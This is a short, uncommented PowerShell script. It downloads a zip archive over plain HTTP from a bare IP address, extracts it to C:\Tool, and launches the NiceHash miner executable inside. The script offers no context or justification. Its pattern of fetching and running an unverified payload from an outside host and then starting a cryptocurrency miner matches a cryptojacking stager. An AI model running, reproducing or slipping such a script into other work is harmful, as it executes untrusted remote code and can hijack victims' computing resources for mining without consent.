[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

Invoke-WebRequest http://139.180.134.229/Tool.Zip -outfile c:\Tool.Zip
Expand-Archive -Path c:\Tool.Zip -DestinationPath C:\Tool
Start-Process C:\Tool\nhm_windows_1.9.0.23\NiceHashMinerLegacy.exe  -Wait
